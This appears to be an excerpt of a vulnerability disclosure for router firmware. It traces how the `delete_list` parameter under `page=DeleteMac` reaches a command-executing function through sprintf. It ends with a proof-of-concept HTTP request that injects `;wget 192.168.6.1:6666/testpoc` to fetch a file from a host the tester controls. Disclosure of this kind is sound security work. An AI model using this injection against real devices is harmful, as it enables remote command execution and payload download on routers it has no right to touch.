...
When the value of `page` is `DeleteMac`, the function sub_402E04 will be called.

<div  align="center"><img src="./img/ftext.png" style="zoom:80%;" /></div>

the value of the `delete_list`  is inserted into `v16`  using `sprintf`,and the value of v16 will be handled by the function sub_404850.
...
We set `delete_list` as **;wget 192.168.6.1:6666/testpoc** , and the router will execute it,such as:
...
Cookie: session=999401581
Connection: keep-alive
Content-Length: 57

page=DeleteMac&delete_list=;wget 192.168.6.1:6666/testpoc
```
